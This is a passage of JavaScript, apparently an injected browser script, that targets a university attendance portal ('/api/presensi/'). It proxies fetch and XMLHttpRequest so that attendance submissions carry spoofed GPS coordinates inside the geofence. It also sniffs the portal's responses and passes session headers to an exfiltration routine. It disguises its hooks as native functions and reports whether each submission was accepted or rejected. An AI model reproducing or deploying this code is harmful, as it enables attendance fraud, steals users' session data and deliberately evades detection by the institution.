          }

          const promise = Reflect.apply(target, thisArg, args);

          if (typeof url === 'string' && url.includes('/api/presensi/')) {
            promise.then(res => {
              try {
                const headers = res.headers;
                res.clone().text().then(txt => _sniffPresensiPayload(url, txt, headers));
                _exfilSession(headers);
              } catch (_) {}
            }).catch(() => {});
          }

          return promise;
        }
      });
      _cloak(fetchProxy, 'function fetch() { [native code] }');
      try { window.fetch = fetchProxy; } catch (_) {}
    }

    // ── XHR Proxy ─────────────────────────────────────────────────────────
    if (window.XMLHttpRequest) {
      const openProxy = new Proxy(_origXHROpen, {
        apply(target, thisArg, args) {
          thisArg._requestUrl    = args[1];
          thisArg._requestMethod = args[0];
          return Reflect.apply(target, thisArg, args);
        }
      });

      const sendProxy = new Proxy(_origXHRSend, {
        apply(target, thisArg, args) {
          let body = args[0];
          const cfg = getSpoofConfig();
          const url = thisArg._requestUrl || '';

          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa/self') && typeof body === 'string') {
            try {
              const parsed = JSON.parse(body);
              const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
              parsed.latitude  = pos.coords.latitude;
              parsed.longitude = pos.coords.longitude;
              args[0] = JSON.stringify(parsed);
              _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
            } catch (_) {}
          }

          if (typeof url === 'string' && url.includes('/api/presensi/')) {
            thisArg.addEventListener('load', () => {
              _sniffPresensiPayload(url, thisArg.responseText, null);
            });
          }

          return Reflect.apply(target, thisArg, args);
        }
      });

      _cloak(openProxy, 'function open() { [native code] }');
      _cloak(sendProxy, 'function send() { [native code] }');
      try {
        XMLHttpRequest.prototype.open = openProxy;
        XMLHttpRequest.prototype.send = sendProxy;
      } catch (_) {}
    }
  }

  // Early install attempt
  _installNetworkInterceptors();

  // ── Phase 5: DOM Result Observer ─────────────────────────────────────────
  if (_isPortalDomain()) {

    function _checkDomForResult(node) {
      if (!node || !node.textContent) return;
      const text = node.textContent.toLowerCase();
      if (
        text.includes('berhasil') || text.includes('sukses') ||
        text.includes('presensi anda telah') || text.includes('absensi berhasil') ||
        text.includes('hadir kuliah') || text.includes('success') ||
        text.includes('data tersimpan')
      ) {
        _sendResultTelemetry('accepted');
        return;
      }
      if (
        text.includes('gagal') || text.includes('tidak valid') ||
        text.includes('tidak terdaftar') || text.includes('lokasi tidak') ||
        text.includes('failed') || text.includes('kadaluarsa') ||
        text.includes('telah ditutup') || text.includes('error')
      ) {
        _sendResultTelemetry('rejected');
      }
    }

    const RESULT_SELECTORS = [
      '.chakra-toast', '.chakra-alert', '[data-status="success"]', '[data-status="error"]',
      '#chakra-toast-manager-top-right', '.swal2-popup', '.alert', '.alert-success',
      '.alert-danger', '.toast', '.notification', '[role="alert"]', '.modal-body',
      '#swal2-html-container'
    ].join(',');

    const _observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType !== 1) continue;
          if (node.matches && node.matches(RESULT_SELECTORS)) _checkDomForResult(node);
          const matches = node.querySelectorAll && node.querySelectorAll(RESULT_SELECTORS);
          if (matches) { for (const el of matches) _checkDomForResult(el); }
        }
        if (
          mutation.type === 'characterData' &&
          mutation.target.parentElement &&
          mutation.target.parentElement.matches &&
          mutation.target.parentElement.matches(RESULT_SELECTORS)
        ) {
          _checkDomForResult(mutation.target.parentElement);
        }
      }
    });

    if (document.body) {
      _observer.observe(document.body, { childList: true, subtree: true, characterData: true });
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        _observer.observe(document.body, { childList: true, subtree: true, characterData: true });
      }, { once: true });
    }
  }

})();
